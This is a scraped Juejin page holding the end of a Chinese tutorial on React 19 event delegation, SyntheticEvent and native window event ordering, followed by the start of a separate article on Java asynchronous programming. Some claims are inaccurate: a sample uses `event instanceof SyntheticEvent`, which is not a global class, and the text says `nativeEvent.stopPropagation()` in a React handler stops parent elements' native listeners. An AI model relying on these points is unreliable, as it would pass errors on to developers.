<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 事件注册表：存储 React 组件的事件信息</span>
<span class="hljs-keyword">const</span> eventRegistry = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-comment">// 2. React 根容器（模拟 #root）</span>
<span class="hljs-keyword">const</span> root = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>);

<span class="hljs-comment">// 3. 统一事件处理函数（根容器绑定的原生事件处理函数）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRootEvent</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-comment">// e.target 是事件的实际目标（如按钮）</span>
  <span class="hljs-keyword">const</span> target = e.<span class="hljs-property">target</span>;

  <span class="hljs-comment">// 从事件注册表中查找当前目标及祖先元素的事件处理函数</span>
  <span class="hljs-keyword">let</span> current = target;
  <span class="hljs-keyword">const</span> handlers = [];

  <span class="hljs-keyword">while</span> (current &amp;&amp; current !== root) {
    <span class="hljs-comment">// 查找当前元素对应的事件处理函数（这里简化为 click 事件）</span>
    <span class="hljs-keyword">const</span> eventKey = <span class="hljs-string">`<span class="hljs-subst">${current.dataset.reactId}</span>-click`</span>;
    <span class="hljs-keyword">if</span> (eventRegistry.<span class="hljs-title function_">has</span>(eventKey)) {
      handlers.<span class="hljs-title function_">push</span>(eventRegistry.<span class="hljs-title function_">get</span>(eventKey));
    }
    <span class="hljs-comment">// 向上遍历祖先元素（模拟冒泡）</span>
    current = current.<span class="hljs-property">parentNode</span>;
  }

  <span class="hljs-comment">// 执行找到的事件处理函数（顺序：子元素 → 父元素，模拟 React 事件冒泡）</span>
  handlers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">handler</span> =&gt;</span> <span class="hljs-title function_">handler</span>(e));
}

<span class="hljs-comment">// 4. 给根容器绑定原生事件（模拟 React 初始化时的绑定）</span>
root.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleRootEvent);

<span class="hljs-comment">// 5. 模拟 React 组件绑定事件（将事件存入注册表）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">bindReactEvent</span>(<span class="hljs-params">reactId, element, eventType, handler</span>) {
  element.<span class="hljs-property">dataset</span>.<span class="hljs-property">reactId</span> = reactId; <span class="hljs-comment">// 给元素标记 React ID</span>
  <span class="hljs-keyword">const</span> eventKey = <span class="hljs-string">`<span class="hljs-subst">${reactId}</span>-<span class="hljs-subst">${eventType}</span>`</span>;
  eventRegistry.<span class="hljs-title function_">set</span>(eventKey, handler);
}

<span class="hljs-comment">// 6. 测试：创建组件元素并绑定 React 事件</span>
<span class="hljs-keyword">const</span> parentDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
parentDiv.<span class="hljs-property">style</span>.<span class="hljs-property">padding</span> = <span class="hljs-string">'20px'</span>;
parentDiv.<span class="hljs-property">style</span>.<span class="hljs-property">border</span> = <span class="hljs-string">'1px solid #ccc'</span>;

<span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'button'</span>);
btn.<span class="hljs-property">textContent</span> = <span class="hljs-string">'点击测试'</span>;
parentDiv.<span class="hljs-title function_">appendChild</span>(btn);
root.<span class="hljs-title function_">appendChild</span>(parentDiv);

<span class="hljs-comment">// 给父元素绑定 React 点击事件</span>
<span class="hljs-title function_">bindReactEvent</span>(<span class="hljs-string">'parent-1'</span>, parentDiv, <span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父元素 React 事件：onClick 触发'</span>);
});

<span class="hljs-comment">// 给子元素绑定 React 点击事件</span>
<span class="hljs-title function_">bindReactEvent</span>(<span class="hljs-string">'btn-1'</span>, btn, <span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素 React 事件：onClick 触发'</span>);
});

<span class="hljs-comment">// 给子元素绑定原生点击事件</span>
btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素原生事件：addEventListener 触发'</span>);
});

<span class="hljs-comment">// 给父元素绑定原生点击事件</span>
parentDiv.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父元素原生事件：addEventListener 触发'</span>);
});
</code></pre>
<p>运行这段代码后，点击按钮的输出顺序和我们之前的 React 案例完全一致！这就验证了 React 事件代理的核心逻辑：<strong>React 事件是通过根容器的原生事件统一捕获，再通过事件注册表查找并执行对应的处理函数，其“冒泡”是模拟出来的，而非原生 DOM 冒泡</strong>。</p>
<h2 data-id="heading-5">三、核心原理 2：React UI 事件与原生 window 事件的关系</h2>
<p>理解了事件代理机制后，我们就能清晰厘清 React UI 事件与原生 window 事件的关系了。首先要明确两个核心概念：</p>
<ul>
<li><strong>React UI 事件</strong>：就是我们在组件中写的 onClick、onChange 等事件，是 React 封装后的“合成事件”，依赖事件代理机制执行；</li>
<li><strong>原生 window 事件</strong>：就是通过 window.addEventListener 绑定的事件（如 resize、scroll、click 等），是浏览器原生支持的事件，遵循原生 DOM 事件流（捕获→目标→冒泡）。</li>
</ul>
<h3 data-id="heading-6">1. 两者的核心关联：事件流的先后顺序</h3>
<p>React UI 事件的执行依赖于根容器的原生事件捕获，而根容器是 window 下的一个 DOM 节点。因此，React UI 事件的执行顺序，必然处于原生事件流的“冒泡阶段”（因为事件要先冒泡到根容器，才能被 React 的统一处理函数捕获）。</p>
<p>我们用“原生事件流+React 事件流”的组合流程图，梳理两者的先后关系：</p>
<h3 data-id="heading-7">2. 代码验证：React 事件与 window 事件的顺序</h3>
<p>我们用代码验证上述流程，给 window 绑定捕获和冒泡阶段的 click 事件：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">EventWithWindowDemo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> btnRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// React 事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'React 事件：onClick 触发'</span>);
  };

  <span class="hljs-comment">// 原生事件（目标元素）</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> btn = btnRef.<span class="hljs-property">current</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleBtnNative</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'目标元素原生事件：冒泡阶段 触发'</span>);
    };
    btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleBtnNative);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> btn.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleBtnNative);
  }, []);

  <span class="hljs-comment">// window 原生事件（捕获阶段）</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleWindowCapture</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'window 原生事件：捕获阶段 触发'</span>);
    };
    <span class="hljs-comment">// 第三个参数为 true，表示在捕获阶段执行</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleWindowCapture, <span class="hljs-literal">true</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleWindowCapture, <span class="hljs-literal">true</span>);
  }, []);

  <span class="hljs-comment">// window 原生事件（冒泡阶段）</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleWindowBubble</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'window 原生事件：冒泡阶段 触发'</span>);
    };
    <span class="hljs-comment">// 第三个参数省略或为 false，表示在冒泡阶段执行</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleWindowBubble);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleWindowBubble);
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{btnRef}</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleReactClick}</span>&gt;</span>
      点击测试（含 window 事件）
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}
</code></pre>
<p>点击按钮后，控制台输出顺序如下，完全符合我们梳理的流程：</p>
<ol>
<li>window 原生事件：捕获阶段 触发（原生捕获阶段从 window 开始）</li>
<li>目标元素原生事件：冒泡阶段 触发（原生目标阶段）</li>
<li>React 事件：onClick 触发（事件冒泡到根容器，被 React 捕获执行）</li>
<li>window 原生事件：冒泡阶段 触发（事件最终冒泡到 window）</li>
</ol>
<h3 data-id="heading-8">3. 关键结论：React 事件是原生事件的“子集”与“延迟执行”</h3>
<p>从上述流程和代码可以得出核心结论：</p>
<ul>
<li>React 事件并非脱离原生事件存在，而是<strong>基于原生事件实现的封装</strong>——React UI 事件的执行，依赖于原生事件冒泡到根容器的过程；</li>
<li>React 事件的执行时机<strong>晚于目标元素及祖先元素的原生事件</strong>（因为要等事件冒泡到根容器），但<strong>早于 window 上的原生冒泡事件</strong>；</li>
<li>window 上的原生捕获事件，会在整个事件流的最开始执行，甚至早于目标元素的原生事件。</li>
</ul>
<h2 data-id="heading-9">四、核心原理 3：合成事件（SyntheticEvent）与原生事件对象的关系</h2>
<p>除了执行顺序，React 事件对象（SyntheticEvent）与原生事件对象也存在差异。在 React 事件处理函数中，我们拿到的 event 不是原生的 Event 对象，而是 React 封装的 SyntheticEvent 对象。</p>
<h3 data-id="heading-10">1. 合成事件的核心作用</h3>
<p>React 封装 SyntheticEvent 的核心目的是：</p>
<ul>
<li><strong>跨浏览器兼容</strong>：不同浏览器的原生事件对象存在差异（如 IE 的 event.srcElement vs 标准的 event.target），SyntheticEvent 统一了这些差异，让开发者无需关注浏览器兼容；</li>
<li><strong>事件对象池复用</strong>：React 会复用 SyntheticEvent 对象（减少内存开销），事件处理函数执行完后，会清空对象的属性（如 event.target、event.preventDefault() 等）；</li>
<li><strong>统一的事件 API</strong>：SyntheticEvent 提供了与原生事件对象相似的 API（如 preventDefault、stopPropagation），但行为有细微差异。</li>
</ul>
<h3 data-id="heading-11">2. 合成事件与原生事件对象的关联</h3>
<p>SyntheticEvent 对象内部持有原生事件对象的引用，可通过 <code>event.nativeEvent</code> 获取原生事件对象。例如：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">SyntheticEvent</span>); <span class="hljs-comment">// true</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">nativeEvent</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Event</span>); <span class="hljs-comment">// true（原生事件对象）</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span> === event.<span class="hljs-property">nativeEvent</span>.<span class="hljs-property">target</span>); <span class="hljs-comment">// true（统一目标元素）</span>
};
</code></pre>
<h3 data-id="heading-12">3. 注意点：合成事件的事件阻止</h3>
<p>在 React 事件中，调用 <code>event.stopPropagation()</code> 只能阻止 React 事件的“模拟冒泡”（即阻止父组件的 React 事件执行），但<strong>无法阻止原生事件的冒泡</strong>；如果要阻止原生事件冒泡，需要调用原生事件对象的 <code>stopPropagation()</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素 React 事件触发'</span>);
  <span class="hljs-comment">// 阻止 React 事件的模拟冒泡（父组件的 React 事件不会执行）</span>
  event.<span class="hljs-title function_">stopPropagation</span>();
  <span class="hljs-comment">// 阻止原生事件的冒泡（父元素的原生事件、window 事件不会执行）</span>
  event.<span class="hljs-property">nativeEvent</span>.<span class="hljs-title function_">stopPropagation</span>();
};
</code></pre>
<p>注意：在 React 17 之前，合成事件的事件池复用机制会导致“异步访问事件属性失效”（如在 setTimeout 中访问 event.target 会是 null），需要用 event.persist() 保留事件属性；React 17 及之后（包括 React 19），移除了事件池复用机制，异步访问事件属性也能正常获取。</p>
<h2 data-id="heading-13">五、实战避坑：React 事件与原生事件协同的常见问题</h2>
<p>理解了上述原理后，我们就能解决实际开发中 React 事件与原生事件协同的常见问题了。下面列举 3 个高频问题及解决方案：</p>
<h3 data-id="heading-14">问题 1：React 事件与原生事件冒泡冲突，导致重复执行</h3>
<p>场景：父组件用 React 事件，子组件用原生事件，点击子组件时，父组件的 React 事件和子组件的原生事件都执行，不符合预期。</p>
<p>解决方案：在子组件的原生事件中，调用原生事件对象的 stopPropagation()，阻止事件冒泡到根容器，从而阻止 React 事件执行：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> btn = btnRef.<span class="hljs-property">current</span>;
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNativeClick</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素原生事件触发'</span>);
    e.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// 阻止原生事件冒泡，React 事件不会执行</span>
  };
  btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> btn.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
}, []);
</code></pre>
<h3 data-id="heading-15">问题 2：window 事件未移除，导致内存泄漏</h3>
<p>场景：在组件中绑定 window 原生事件（如 resize、scroll），组件卸载后，事件未移除，导致内存泄漏。</p>
<p>解决方案：在 useEffect 的清理函数中，移除 window 事件绑定：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleWindowResize</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'窗口大小变化'</span>);
  };
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handleWindowResize);
  <span class="hljs-comment">// 组件卸载时移除事件</span>
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, handleWindowResize);
  };
}, []);
</code></pre>
<h3 data-id="heading-16">问题 3：React 事件中异步访问事件属性失效（React 17 之前）</h3>
<p>场景：在 React 17 及之前版本中，在 setTimeout 中访问 event.target 会是 null。</p>
<p>解决方案：调用 event.persist() 保留事件属性，或提前保存需要的属性：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 方案 1：调用 event.persist()</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  event.<span class="hljs-title function_">persist</span>(); <span class="hljs-comment">// 保留事件属性</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span>); <span class="hljs-comment">// 正常获取</span>
  }, <span class="hljs-number">1000</span>);
};

<span class="hljs-comment">// 方案 2：提前保存属性</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  <span class="hljs-keyword">const</span> target = event.<span class="hljs-property">target</span>; <span class="hljs-comment">// 提前保存</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(target); <span class="hljs-comment">// 正常获取</span>
  }, <span class="hljs-number">1000</span>);
};
</code></pre>
<p>注意：React 17 及之后版本（包括 React 19）已移除事件池复用机制，无需调用 event.persist()，异步访问事件属性也能正常获取。</p>
<h2 data-id="heading-17">六、核心总结</h2>
<p>今天我们从案例出发，拆解了 React 19 事件系统的核心原理，重点厘清了 React UI 事件与原生 window 事件的关系，最后给出了实战避坑方案。核心要点总结如下：</p>
<ol>
<li><strong>React 事件的核心是事件代理</strong>：所有 UI 事件委托给根容器（#root），通过事件注册表查找并执行处理函数，其“冒泡”是模拟的；</li>
<li><strong>React 事件与原生事件的顺序</strong>：window 原生捕获事件 → 目标元素/祖先元素原生事件 → React 事件 → window 原生冒泡事件；</li>
<li><strong>合成事件是原生事件的封装</strong>：提供跨浏览器兼容和统一 API，可通过 event.nativeEvent 获取原生事件对象；</li>
<li><strong>实战避坑关键</strong>：阻止原生冒泡需调用 event.nativeEvent.stopPropagation()；window 事件需在组件卸载时移除；React 17 之前异步访问事件属性需用 event.persist()。</li>
</ol>
<h2 data-id="heading-18">七、下一步学习方向</h2>
<p>掌握了 React 事件系统的核心原理后，下一步可以重点学习：</p>
<ul>
<li>React 19 事件系统的新特性：如对原生事件的进一步优化、与并发渲染的协同等；</li>
<li>事件性能优化：如防抖节流在 React 事件中的应用、避免不必要的事件绑定；</li>
<li>特殊事件场景：如表单事件（onSubmit、onChange）的特殊处理、拖拽事件与 React 事件的协同。</li>
</ul>
<p>如果这篇文章对你有帮助，欢迎点赞、收藏、转发～ 有任何问题也可以在评论区留言交流～ 我们下期再见！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 异步调用失败导致系统崩溃？这份重试机制救了我]]></title>    <link>https://juejin.cn/post/7594322573453033515</link>    <guid>https://juejin.cn/post/7594322573453033515</guid>    <pubDate>2026-01-13T01:17:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573453033515" data-draft-id="7583910418658295854" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 异步调用失败导致系统崩溃？这份重试机制救了我"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-13T01:17:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员大华"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 异步调用失败导致系统崩溃？这份重试机制救了我
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员大华
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:17:59.000Z" title="Tue Jan 13 2026 01:17:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.异步编程介绍</h2>
<h3 data-id="heading-1">什么是异步编程</h3>
<p>异步编程是一种非阻塞的编程模式，允许程序在等待某个操作完成时继续执行其他任务，而不是一直等待。</p>
<p>当操作完成后，通过回调函数、Future 或事件通知等方式获取结果。</p>
<p><strong>同步 vs 异步对比：</strong></p>
<ul>
<li><strong>同步</strong>：顺序执行，每一步必须等待前一步完成</li>
<li><strong>异步</strong>：非阻塞执行，可以同时处理多个任务</li>
</ul>
<h3 data-id="heading-2">Java 中的异步实现方式</h3>
<h4 data-id="heading-3">1. CompletableFuture (Java 8+)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建异步任务</span>
CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; {
    <span class="hljs-comment">// 模拟耗时操作</span>
    <span class="hljs-keyword">try</span> {
        Thread.sleep(<span class="hljs-number">1000</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-string">"异步任务结果"</span>;
});

<span class="hljs-comment">// 处理结果</span>
future.thenAccept(result -&gt; System.out.println(<span class="hljs-string">"结果: "</span> + result));
</code></pre>
<h4 data-id="heading-4">2. @Async 注解 (Spring Framework)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncService</span> {
    
    <span class="hljs-meta">@Async</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">asyncMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 异步执行的方法</span>
        <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(<span class="hljs-string">"执行结果"</span>);
    }
}
</code></pre>
<h4 data-id="heading-5">3. 回调函数</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Callback</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(String result)</span>;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Exception e)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">asyncOperation</span><span class="hljs-params">(Callback callback)</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 模拟操作</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> doSomething();
            callback.onSuccess(result);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            callback.onError(e);
        }
    }).start();
}
</code></pre>
